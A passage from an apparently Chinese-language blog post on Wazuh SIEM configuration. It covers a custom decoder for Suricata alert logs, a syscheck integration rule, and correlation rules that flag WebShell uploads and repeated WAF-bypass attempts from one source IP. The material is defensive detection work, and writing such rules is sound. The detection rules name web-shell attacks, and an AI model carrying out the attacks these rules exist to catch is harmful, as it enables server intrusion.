Custom external Integration --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">integration</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span>custom-syscheck<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">rule_id</span>&gt;</span>554<span class="tag">&lt;/<span class="name">rule_id</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">group</span>&gt;</span>syscheck<span class="tag">&lt;/<span class="name">group</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">alert_format</span>&gt;</span>json<span class="tag">&lt;/<span class="name">alert_format</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">integration</span>&gt;</span></span><br><span class="line">  </span><br><span class="line">  <span class="comment">&lt;!-- Custom syscheck.json --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">localfile</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">log_format</span>&gt;</span>json<span class="tag">&lt;/<span class="name">log_format</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">location</span>&gt;</span>/var/ossec/logs/syscheck.json<span class="tag">&lt;/<span class="name">location</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">localfile</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">ossec_config</span>&gt;</span></span><br></pre></td></tr></table></figure>

<ul>
<li><h6 id="local-decoder-normalized-xml"><a href="#local-decoder-normalized-xml" class="headerlink" title="local_decoder_normalized.xml"></a>local_decoder_normalized.xml</h6></li>
</ul>
<p><strong>Sample</strong></p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">2020 Mar 03 02:53:39 logstash NORMALIZED[-]: &#123;&quot;timestamp&quot;:&quot;2020-02-21T19:47:04.382300+0800&quot;,&quot;flow_id&quot;:1133835979634527,&quot;in_iface&quot;:&quot;wlp3s0&quot;,&quot;event_type&quot;:&quot;alert&quot;,&quot;src_ip&quot;:&quot;192.168.199.97&quot;,&quot;src_port&quot;:60022,&quot;dest_ip&quot;:&quot;192.168.199.162&quot;,&quot;dest_port&quot;:59143,&quot;proto&quot;:&quot;TCP&quot;,&quot;alert&quot;:&#123;&quot;action&quot;:&quot;allowed&quot;,&quot;gid&quot;:1,&quot;signature_id&quot;:123456,&quot;rev&quot;:1,&quot;signature&quot;:&quot;LOCAL RULES XXX&quot;,&quot;severity&quot;:3&#125;&#125;</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">decoder</span> <span class="attr">name</span>=<span class="string">&quot;nta_json&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">prematch</span>&gt;</span>NORMALIZED[-]: <span class="tag">&lt;/<span class="name">prematch</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">plugin_decoder</span> <span class="attr">offset</span>=<span class="string">&quot;after_prematch&quot;</span>&gt;</span>JSON_Decoder<span class="tag">&lt;/<span class="name">plugin_decoder</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">decoder</span>&gt;</span></span><br></pre></td></tr></table></figure>

<ul>
<li><h6 id="0901-local-raw-xml"><a href="#0901-local-raw-xml" class="headerlink" title="0901-local_raw.xml"></a>0901-local_raw.xml</h6><ul>
<li>默认引用的解码器为<code>json</code>, 这里需要修改为刚才新增的<code>nta_json</code>;</li>
<li>通过<code>overwrite=yes</code>覆盖原始规则;</li>
</ul>
</li>
</ul>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">group</span> <span class="attr">name</span>=<span class="string">&quot;suricata,&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!-- /var/ossec/ruleset/rules/0475-suricata_rules.xml --&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- Defind Suricata Rules --&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- ID: 86600 - 86699 --&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">rule</span> <span class="attr">id</span>=<span class="string">&quot;86600&quot;</span> <span class="attr">level</span>=<span class="string">&quot;0&quot;</span> <span class="attr">overwrite</span>=<span class="string">&quot;yes&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">decoded_as</span>&gt;</span>nta_json<span class="tag">&lt;/<span class="name">decoded_as</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">field</span> <span class="attr">name</span>=<span class="string">&quot;timestamp&quot;</span>&gt;</span>\.+<span class="tag">&lt;/<span class="name">field</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">field</span> <span class="attr">name</span>=<span class="string">&quot;event_type&quot;</span>&gt;</span>\.+<span class="tag">&lt;/<span class="name">field</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">description</span>&gt;</span>Suricata messages.<span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">options</span>&gt;</span>no_full_log<span class="tag">&lt;/<span class="name">options</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">rule</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">group</span>&gt;</span></span><br></pre></td></tr></table></figure>

<ul>
<li><h6 id="0905-local-syscheck-xml"><a href="#0905-local-syscheck-xml" class="headerlink" title="0905-local_syscheck.xml"></a>0905-local_syscheck.xml</h6><p>为预处理脚本生成的日志进行解析</p>
</li>
</ul>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">group</span> <span class="attr">name</span>=<span class="string">&quot;syscheck,&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">rule</span> <span class="attr">id</span>=<span class="string">&quot;187100&quot;</span> <span class="attr">level</span>=<span class="string">&quot;7&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">decoded_as</span>&gt;</span>json<span class="tag">&lt;/<span class="name">decoded_as</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">field</span> <span class="attr">name</span>=<span class="string">&quot;integration&quot;</span>&gt;</span>custom-syscheck<span class="tag">&lt;/<span class="name">field</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">description</span>&gt;</span>syscheck integration messages.<span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">options</span>&gt;</span>no_full_log<span class="tag">&lt;/<span class="name">options</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">rule</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">group</span>&gt;</span></span><br></pre></td></tr></table></figure>

<ul>
<li><h6 id="9999-local-composite-xml"><a href="#9999-local-composite-xml" class="headerlink" title="9999-local_composite.xml"></a>9999-local_composite.xml</h6></li>
</ul>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">group</span> <span class="attr">name</span>=<span class="string">&quot;local,composite,&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!-- Local Composite Rules Range ID: 200000 - 205000 --&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">rule</span> <span class="attr">id</span>=<span class="string">&quot;200000&quot;</span> <span class="attr">level</span>=<span class="string">&quot;15&quot;</span> <span class="attr">frequency</span>=<span class="string">&quot;2&quot;</span> <span class="attr">timeframe</span>=<span class="string">&quot;600&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">if_matched_sid</span>&gt;</span>101000<span class="tag">&lt;/<span class="name">if_matched_sid</span>&gt;</span> <span class="comment">&lt;!-- 文件上传类规则 or 检测WebShell上传类规则 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">if_sid</span>&gt;</span>187100<span class="tag">&lt;/<span class="name">if_sid</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">same_source_ip</span> /&gt;</span>	<span class="comment">&lt;!-- 通过IP进行关联 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">description</span>&gt;</span>Phase 3: 检测到服务器:$(srcip), 被上传WebShell.<span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">options</span>&gt;</span>no_full_log<span class="tag">&lt;/<span class="name">options</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">rule</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">rule</span> <span class="attr">id</span>=<span class="string">&quot;200001&quot;</span> <span class="attr">level</span>=<span class="string">&quot;12&quot;</span> <span class="attr">frequency</span>=<span class="string">&quot;2&quot;</span> <span class="attr">timeframe</span>=<span class="string">&quot;600&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">if_matched_sid</span>&gt;</span>88801<span class="tag">&lt;/<span class="name">if_matched_sid</span>&gt;</span> <span class="comment">&lt;!-- WAF安全事件 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">if_group</span>&gt;</span>ids<span class="tag">&lt;/<span class="name">if_group</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">same_source_ip</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">description</span>&gt;</span>Phase 3: Alarm - Same ip Bypass WAF of within 600 seconds. $(srcip) -&gt; $(http.hostname) -&gt; $(alert.signature) -&gt; $(alert.signature_id).<span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">options</span>&gt;</span>no_full_log<span class="tag">&lt;/<span class="name">options</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">rule</span>&gt;</span></span><br><span class="line">  </span><br><span class="line"><span class="tag">&lt;/<span class="name">group</span>&gt;</span></span><br></pre></td></tr></table></figure>



<h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><ol>
<li><p>对于<strong>WebShell</strong>关联检测,目前采用的是同源IP以及时序的关联, 最为靠谱的应该是通过Hash的比对。这里要吐槽一下Suricata默认的fileinfo, 没办法自定义输出, 只要开启可被还原的协议都会输出fileinfo的事件。正因如此, 数据量一大Wazuh的引擎压力会很大。我尝试通过<strong>Lua</strong>来自定义一个文件审计类的事件, 貌似也同样没办法区分协议更别说针对http过滤条件进行自定义的过滤输出了。</p>
</li>
<li><p>由于关联规则本身是通过底层多个安全事件进行维度的关联提升告警的<strong>可靠性</strong>。因此, 底层安全事件不够准确同样会让上层的关联规则带来大量误报。对于底层安全事件的优化也是需要持续进行的。</p>
</li>
<li><p>  <strong>Wazuh v3.11.4</strong> 采用syslog接收大日志时, 会触发<code>memory violation</code>导致<code>ossec-remoted</code>进程重启, 该问题已向社区反馈下个版本中会解决。</p>
</li>
</ol>
<h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><ul>
<li><p><strong><a target="_blank" rel="noopener" href="https://wazuh.com/blog/how-to-forward-android-syslog-to-wazuh/">How to forward Android syslog to Wazuh</a></strong></p>
</li>
<li><p><strong><a target="_blank" rel="noopener" href="https://wazuh.com/blog/how-to-configure-rsyslog-client-to-send-events-to-wazuh/">How to configure Rsyslog client to send events to Wazuh</a></strong></p>
</li>
<li><p><strong><a target="_blank" rel="noopener" href="https://wazuh.com/blog/how-to-integrate-external-software-using-integrator/">How to integrate external software using Integrator</a></strong></p>
</li>
</ul>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




  <nav class="pagination">
    <a class="extend prev" rel="prev" href="/"><i class="fa fa-angle-left" aria-label="上一页"></i></a><a class="page-number" href="/">1</a><span class="page-number current">2</span><a class="page-number" href="/page/3/">3</a><a class="page-number" href="/page/4/">4</a><a class="extend next" rel="next" href="/page/3/"><i class="fa fa-angle-right" aria-label="下一页"></i></a>
  </nav>
<script src="/js/comments.js"></script>
</div>
  </main>

  <footer class="footer">
    <div class="footer-inner">


<div class="copyright">
  &copy; 
  <span itemprop="copyrightYear">2024</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">Canon</span>
</div>
<div class="wordcount">
  <span class="post-meta-item">
    <span class="post-meta-item-icon">
      <i class="fa fa-chart-line"></i>
    </span>
    <span title="站点总字数">225k</span>
  </span>
  <span class="post-meta-item">
    <span class="post-meta-item-icon">
      <i class="fa fa-coffee"></i>
    </span>
    <span title="站点阅读时长">3:25</span>
  </span>
</div>

    </div>
  </footer>

  
  <script src="https://cdn.jsdelivr.net/npm/animejs@3.2.1/lib/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
<script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/schemes/muse.js"></script><script src="/js/next-boot.js"></script>

  
<script src="/js/third-party/search/local-search.js"></script>






  





</body>
</html>
